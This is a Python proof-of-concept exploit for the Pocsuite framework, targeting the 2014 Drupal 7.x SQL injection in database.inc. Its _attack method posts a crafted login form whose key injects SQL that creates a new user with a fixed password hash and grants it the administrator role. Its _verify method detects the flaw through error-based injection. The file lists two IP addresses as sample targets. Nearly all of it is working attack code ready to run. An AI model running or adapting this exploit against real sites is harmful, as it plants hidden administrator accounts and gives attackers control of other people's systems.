#!/usr/bin/env python
# coding: utf-8
import random
import string
import urllib
from collections import OrderedDict

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '1571'  # vul ID
    version = '1'
    author = 'zhengdt'
    vulDate = '2014-10-16'
    createDate = '2014-10-16'
    updateDate = '2014-10-16'
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'
    appPowerLink = 'https://www.drupal.org/'
    appName = 'Drupal'
    appVersion = '7.x'
    vulType = 'SQL Injection'
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    '''

    samples = ['http://216.119.147.168/', 'http://69.172.67.176/']

    def _attack(self):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        uid = int(random.random() * 1000)
        username = ''.join(random.sample(string.letters + string.digits, 5))
        payload = OrderedDict()

        if not self._verify(verify=False):
            return self.parse_attack(result)

        payload['name[0;insert into users(uid, name, pass, status, data) values (%d, \'%s\', ' \
                '\'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld\', 1, \'{b:0;}\');' \
                'insert into users_roles(uid, rid) values (%d, 3);#]' % (uid, username, uid)] \
            = 'test'
        payload['name[0]'] = 'test2'
        payload['pass'] = 'test'
        payload['form_id'] = 'user_login_block'

        # print urllib.urlencode(payload)
        response = req.post(vul_url, data=payload)
        if response.status_code == 200:
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = username
            result['AdminInfo']['Password'] = 'thanks'

        return self.parse_attack(result)

    def _verify(self, verify=True):
        result = {}
        vul_url = '%s/?q=node&destination=node' % self.url
        payload = {
            'name[0 and (select 1 from (select count(*),concat((select md5(715890248' \
            '135)),floor(rand(0)*2))x from  information_schema.tables group by x' \
            ')a);;#]': 'test',
            'name[0]': 'test2',
            'pass': 'test',
            'form_id': 'user_login_block',
        }

        response = req.post(vul_url, data=payload).content
        if 'e4f5fd37a92eb41ba575c81bf0d31591' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = urllib.urlencode(payload)

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
